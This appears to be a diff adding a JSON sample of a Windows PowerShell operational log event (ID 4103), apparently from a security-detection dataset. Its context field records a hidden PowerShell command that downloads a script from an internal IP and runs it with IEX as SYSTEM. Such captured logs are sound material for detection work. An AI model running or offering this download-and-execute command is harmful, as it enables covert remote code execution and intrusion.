@@ -1,0 +1,48 @@
+{
+    "Event": {
+        "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+        "System": {
+            "Provider": {
+                "Name": "Microsoft-Windows-PowerShell",
+                "Guid": "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
+            },
+            "EventID": "4103",
+            "Version": "1",
+            "Level": "4",
+            "Task": "106",
+            "Opcode": "20",
+            "Keywords": "0x0",
+            "TimeCreated": {
+                "SystemTime": "2019-04-03T09:04:15.754253800Z"
+            },
+            "EventRecordID": "4416606",
+            "Correlation": {
+                "ActivityID": "{B277B989-E9FB-0002-DDBD-77B2FBE9D401}"
+            },
+            "Execution": {
+                "ProcessID": "2388",
+                "ThreadID": "2412"
+            },
+            "Channel": "Microsoft-Windows-PowerShell/Operational",
+            "Computer": "WIN1.PTSEC.com",
+            "Security": {
+                "UserID": "S-1-5-18"
+            }
+        },
+        "EventData": {
+            "Data": [
+                {
+                    "text": "        Severity = Informational\r\n        Host Name = Default Host\r\n        Host Version = 5.1.15063.786\r\n        Host ID = 3bb4ab63-2418-44a8-a0b1-2a8e579cbecd\r\n        Host Application = powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.11.210:80/b'))\r\n        Engine Version = 5.1.15063.786\r\n        Runspace ID = 3fc75ad0-a273-40df-ac3c-95732a60e246\r\n        Pipeline ID = 1\r\n        Command Name = Set-StrictMode\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 38\r\n        User = PTSEC\\SYSTEM\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n",
+                    "Name": "ContextInfo"
+                },
+                {
+                    "Name": "UserData"
+                },
+                {
+                    "text": "CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Version\"; value=\"1.0\"\r\n",
+                    "Name": "Payload"
+                }
+            ]
+        }
+    }
+}
